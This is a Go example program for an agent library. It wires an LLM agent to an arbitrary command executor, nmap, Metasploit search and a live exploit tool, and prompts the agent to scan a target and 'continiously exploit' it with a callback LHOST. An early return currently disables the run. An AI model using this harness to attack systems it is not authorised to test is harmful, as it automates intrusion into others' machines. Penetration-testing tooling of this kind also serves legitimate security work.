package main

import (
	"context"
	"encoding/json"
	"fmt"
	"os"

	"github.com/Swarmind/libagent/pkg/config"
	"github.com/Swarmind/libagent/pkg/tools"

	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

/*
	This example shows usage of command executor with rewoo tool, which are whitelisted.
*/

const Prompt = `Please scan %s for open ports and generate Metasploit search queries for any found services. After that try to continiously exploit target, using %s as LHOST and target address as RHOST and module(s) found from metasploit search`

type NmapToolArgs struct {
	IP string `json:"ip"`
}

func main() {
	zerolog.SetGlobalLevel(zerolog.DebugLevel)
	log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr})

	cfg, err := config.NewConfig()
	if err != nil {
		log.Fatal().Err(err).Msg("new config")
	}

	ctx := context.Background()

	toolsExecutor, err := tools.NewToolsExecutor(ctx, cfg, tools.WithToolsWhitelist(
		tools.ReWOOToolDefinition.Name,
		tools.CommandExecutorDefinition.Name,
		tools.NmapToolDefinition.Name,
		tools.MsfSearchToolDefinition.Name,
		tools.ExploitToolDefinition.Name, // WARN! THIS WILL RUN THE ACTUAL EXPLOIT, THIS IS DANGEROUSE ZONE! USE IT ONLY WHEN READY!
	))
	if err != nil {
		log.Fatal().Err(err).Msg("new tools executor")
	}
	defer func() {
		if err := toolsExecutor.Cleanup(); err != nil {
			log.Fatal().Err(err).Msg("tools executor cleanup")
		}
	}()

	rhost, exists := os.LookupEnv("HACKER_MSF_RHOST")
	if !exists {
		log.Fatal().Msg("HACKER_MSF_RHOST env cannot be empty")
	}
	lhost, exists := os.LookupEnv("HACKER_MSF_LHOST")
	if !exists {
		log.Fatal().Msg("HACKER_MSF_LHOST env cannot be empty")
	}

	fmt.Println(rhost, lhost)

	return

	rewooQuery := tools.ReWOOToolArgs{
		Query: fmt.Sprintf(Prompt, rhost, lhost),
	}
	rewooQueryBytes, err := json.Marshal(rewooQuery)
	if err != nil {
		log.Fatal().Err(err).Msg("json marhsal rewooQuery")
	}

	result, err := toolsExecutor.CallTool(ctx,
		tools.ReWOOToolDefinition.Name,
		string(rewooQueryBytes),
	)
	if err != nil {
		log.Fatal().Err(err).Msg("rewoo tool call")
	}

	fmt.Println(result)
}
